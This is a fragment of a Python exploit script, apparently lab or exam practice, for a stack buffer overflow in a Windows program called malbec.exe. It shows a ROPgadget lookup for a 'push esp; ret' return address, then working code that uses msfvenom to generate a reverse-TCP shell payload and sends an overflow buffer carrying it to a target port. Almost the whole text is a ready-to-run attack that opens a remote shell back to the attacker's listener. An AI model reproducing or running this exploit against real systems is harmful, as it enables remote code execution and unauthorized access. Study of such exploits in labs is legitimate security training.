### 4: Finding return address #####################################
'''
hacker@hackerbook /r/m/h/W/U/z/D/S/G/S/C/P/O/P/Malbec (master)> ROPgadget --binary malbec.exe | grep 0x41101503
0x41101503 : push esp ; ret
hacker@hackerbook /r/m/h/W/U/z/D/S/G/S/C/P/O/P/Malbec (master)> 
'''
### 5: Exploit ######################################################

import os

def genPayload(LHOST, LPORT):
    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"
    badchars = "\\x00"
    command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+str(LPORT)+" EXITFUNC=thread  -b '"+badchars+"' -f py -o msfpayload.py"
    os.system(command)
    import msfpayload
    payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    return payload
    #######################################################################

def exploit(payload, RHOST, RPORT):
    prefix = ""
    offset = 340
    overflow = "A" * offset
    retn = "\x41\x10\x15\x03"[::-1] # Return Address
    padding = "\x90"*10 #+ "\xcc"
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send(""+ buffer)
##################################### 
 
payload = genPayload('192.168.1.6', 4444)
exploit(payload, '192.168.1.6', 7138)
